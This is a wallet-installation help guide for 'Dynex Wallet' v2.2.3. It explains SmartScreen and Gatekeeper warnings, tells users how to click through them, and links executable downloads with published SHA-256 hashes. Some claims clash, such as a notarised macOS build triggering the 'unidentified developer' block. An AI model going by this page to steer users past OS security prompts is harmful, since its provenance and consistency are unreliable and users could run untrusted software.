<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# Dynex Wallet SmartScreen / Gatekeeper Warning: What To Do

**This is a normal first-run warning from Windows or macOS for independent software, not a sign the Dynex Wallet installer is unsafe -- verify the file, then proceed through the prompt.**

If you've just downloaded Dynex Wallet and your operating system is warning you before it will open, you're not alone. This happens to most independently distributed desktop apps, including open-source wallets, and there's a safe, standard way to get past it.

## You'll see this if...

- Windows shows "Windows protected your PC" with a blue "More info" link after you double-click the installer.
- macOS shows "Dynex Wallet can't be opened because it is from an unidentified developer" or similar, after you try to open the app from Applications.
- You're installing on a new machine and this is the very first time you've run the Dynex Wallet app there.
- You searched online about the warning and found conflicting advice about disabling security features entirely.

## Why it happens

Windows SmartScreen flags applications based on how widely they've been downloaded and run across the Windows user base ("reputation"), not purely on whether they're digitally signed. A signed, legitimate installer from a smaller project can still trigger this the first few times it's run on a given machine simply because it hasn't built up enough reputation data yet. macOS Gatekeeper works differently but similarly: it checks whether an app is notarised by Apple, and even notarised apps distributed outside the Mac App Store commonly show a one-time confirmation dialog on first launch. Neither warning by itself means the file is malicious -- it means the file is new or distributed outside the app stores, which is normal for independent desktop software.

## Step-by-step fix

1. Before touching the warning dialog, confirm you downloaded the file from the official [download page](https://dynexwallet.org/download) or the [v2.2.3 GitHub release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3), not a third-party mirror or a link someone sent you directly.
2. Verify the file's SHA-256 checksum against the published value before proceeding -- see [verifying the SHA-256 checksum](./verify-dynex-wallet-sha256-checksum.md) for the exact command for your OS.
3. On Windows: click "More info" on the SmartScreen dialog, confirm the publisher name shown matches Dynex Wallet's signing identity, then click "Run anyway."
4. On macOS: if blocked outright, go to System Settings > Privacy & Security, scroll to the Security section, and click "Open Anyway" next to the Dynex Wallet message, then confirm in the follow-up dialog.
5. Let the installer or app continue as normal from there -- see [installing Dynex Wallet on Windows](./install-dynex-wallet-windows.md) or [installing Dynex Wallet on macOS](./install-dynex-wallet-macos.md) for the rest of the process.
6. After install, confirm the version shown in the app is v2.2.3 to make sure you installed the current, correct build.
7. If you see this warning repeatedly on every launch rather than just the first time, that can indicate the file wasn't fully trusted by the OS (for example, downloaded via a method that strips normal metadata) -- redownload fresh and try again.

## If that didn't work

If you're still unsure whether to proceed, stop and re-verify the checksum rather than clicking through -- a mismatched hash means the file doesn't match what the developers published, and you should not run it. Redownload directly from the official source instead.

If Windows blocks the file entirely with no "Run anyway" option (sometimes seen under stricter enterprise policies), check with your IT administrator, since organization-level Windows policies can override standard SmartScreen behavior -- this isn't something you can or should bypass locally on a managed machine.

If macOS still won't let you open it after using "Open Anyway," make sure you actually downloaded the correct `.dmg` for your chip (Intel vs Apple Silicon support is covered by the same file, but a corrupted download can still cause this) and try redownloading. See [which Dynex Wallet file to download](./which-dynex-wallet-file-to-download.md) if you're unsure.

## Prevent it next time

Always download from [dynexwallet.org](https://dynexwallet.org/) directly or from the official GitHub releases, bookmark the real URL, and be skeptical of ads or search results that look similar but aren't -- see [avoiding fake Dynex Wallets and phishing](https://dynexwallet.org/security) for more on spotting lookalikes. Get in the habit of checking the published checksum every time you download an installer for a wallet, not just when something looks off, since verifying is quick and catches tampering before it matters.

Nobody legitimate will ever ask you to disable your operating system's security features entirely, email you a wallet file to "fix" a warning, or ask for your recovery seed to "verify" your installation -- treat any message like that as a scam regardless of how official it looks.

Installing v2.2.3 specifically is also worth doing even if you already have an older version that you've previously gotten past this warning on. The newer build includes a sync watchdog for wallets stuck at a block, a wallet optimizer for small mining payouts, clearer locked-versus-unconfirmed balance reporting, and remote node support -- none of which are available if you're still running an outdated install just to avoid seeing the warning again.

## FAQ

### Does this warning mean the file is infected?
Not by itself. It reflects the file's reputation or notarisation status with the OS, not a malware scan result. Verifying the checksum is the reliable way to confirm authenticity.

### Is Dynex Wallet's Windows installer actually signed?
Yes, the Windows build is a signed `.exe`.

### Is the macOS build notarised?
Yes, the `.dmg` is notarised by Apple.

### Should I disable SmartScreen or Gatekeeper permanently to avoid this?
No. Disabling these protections system-wide removes security for every app you run, not just Dynex Wallet. Use the one-time "Run anyway" / "Open Anyway" path instead.

### I verified the checksum and it matches -- is it definitely safe to run?
A matching checksum confirms the file matches what the developers published, which is the main thing you can control. It's the strongest verification step available to you as a user.

### What if someone emailed me a Dynex Wallet file directly to fix this warning?
Don't run it. Legitimate help with this warning never requires receiving an installer from a third party -- always redownload from the official site yourself.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it, check the checksum, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

<!-- SHA256:START -->
| Platform | File | SHA-256 |
|---|---|---|
| Windows | [`dynex-wallet-windows-v2.2.3.exe`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) | `d4fd916c9741a16e23e39c355a049bac8368dbefa3ee08663ef56c009964e00d` |
| macOS | [`dynex-wallet-macos-v2.2.3.dmg`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) | `084818fd20207305ded84a747e707fb34f07e1f6e2d9a8123da621b8a546a88d` |
| Linux | [`dynex-wallet-linux-x64-v2.2.3.zip`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip) | `535b453c72c6e7749ffae3b95e1d47f67228b78b9862e086dbd13c4d550481c2` |
<!-- SHA256:END -->

Verify before you run:

```powershell
# Windows
Get-FileHash -Algorithm SHA256 .\dynex-wallet-windows-v2.2.3.exe
```
```bash
# macOS
shasum -a 256 dynex-wallet-macos-v2.2.3.dmg
# Linux
sha256sum dynex-wallet-linux-x64-v2.2.3.zip
```

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [install and verify guides on dynexwallet.org](https://dynexwallet.org/download).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [How to Install Dynex Wallet on Windows](./install-dynex-wallet-windows.md) |
| [How to Install Dynex Wallet on macOS](./install-dynex-wallet-macos.md) |
| [How to Install Dynex Wallet on Linux](./install-dynex-wallet-linux.md) |
| [How to protect your Dynex Wallet file with a strong password](./protect-dynex-wallet-file-password.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
